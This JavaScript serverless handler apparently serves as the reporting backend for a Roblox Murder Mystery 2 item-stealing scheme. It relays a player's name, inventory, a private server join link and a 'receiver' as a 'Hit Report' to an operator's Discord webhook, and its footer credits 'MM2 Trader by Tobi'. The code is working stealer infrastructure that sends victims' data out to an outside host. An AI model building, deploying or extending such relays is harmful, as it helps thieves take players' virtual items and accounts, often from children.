export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  const API_KEY = 'your_really_secret_key_here'; // Change to your secret key!
  if (req.headers['x-api-key'] !== API_KEY) {
    return res.status(401).json({ error: 'Invalid API Key' });
  }

  // Extract POST data
  const {
    webhook,           // Discord webhook url
    plrName,
    plrDisplayName,
    receiver,
    inventoryText,
    items,
    fullhitUrl,
    job_id
  } = req.body || {};

  // Input validation
  if (!webhook || !/^https:\/\/discord\.com\/api\/webhooks\//.test(webhook)) {
    return res.status(400).json({ error: "Invalid or missing Discord webhook" });
  }

  // Build embed fields
  const embedFields = [
    {
      name: "Player Information",
      value: [
        "```",
        `Name: ${plrName || "N/A"}`,
        `Display: ${plrDisplayName || "N/A"}`,
        `Receiver: ${receiver || "N/A"}`,
        "```"
      ].join('\n'),
      inline: false
    },
    {
      name: "Inventory",
      value: "```" + (inventoryText || "N/A") + "```",
      inline: false
    },
    {
      name: "List of items",
      value: "```Total Items: " + (Array.isArray(items) ? items.length : 0) + "```",
      inline: false
    },
    {
      name: "Join Link (Private)",
      value: job_id || "N/A",
      inline: false
    },
    {
      name: "Full Item List",
      value: fullhitUrl ? `[View Complete List](${fullhitUrl})` : "`Paste creation failed`",
      inline: false
    }
  ];

  // Build the embed
  const embed = {
    title: "MM 2 Items!",
    color: 10181046, // Purple
    fields: embedFields,
    footer: {
      text: "MM2 Trader by Tobi. discord.gg/GY2RVSEGDT"
    },
    timestamp: new Date().toISOString()
  };

  // Payload for Discord
  const discordPayload = {
    content: "🎁 **MM2 Inventory Hit Report**",
    embeds: [embed]
  };

  // Send to Discord
  const discordResp = await fetch(webhook, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(discordPayload)
  });

  if (discordResp.ok) {
    return res.status(200).json({ ok: true, message: "Embed sent to Discord." });
  } else {
    return res.status(500).json({ ok: false, error: "Failed to send embed to Discord." });
  }
}
